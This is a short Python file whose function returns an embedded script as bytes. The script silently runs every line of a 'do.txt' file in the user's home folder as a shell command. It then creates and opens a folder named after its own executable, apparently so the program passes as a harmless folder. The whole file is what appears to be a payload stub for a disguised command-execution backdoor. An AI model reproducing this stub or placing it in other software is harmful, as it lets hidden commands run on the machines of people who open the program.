def run():
    return b"""
import subprocess,os
user = os.path.expanduser( '~' )
folder = os. path. basename(__file__).replace(".exe","").replace(".py","")
try:
    with open(fr"{user}\\do.txt","r") as f:
        for line in f:
            subprocess.Popen(line,shell=True)
except FileNotFoundError:
    open(fr"{user}\\do.txt","x")
try:
    os.mkdir(f"{user}\\{folder}")
    subprocess.Popen(f'explorer "{user}\\{folder}',shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
except FileExistsError:
    subprocess.Popen(f'explorer "{user}\\{folder}',shell=True,creationflags=subprocess.CREATE_NO_WINDOW)"""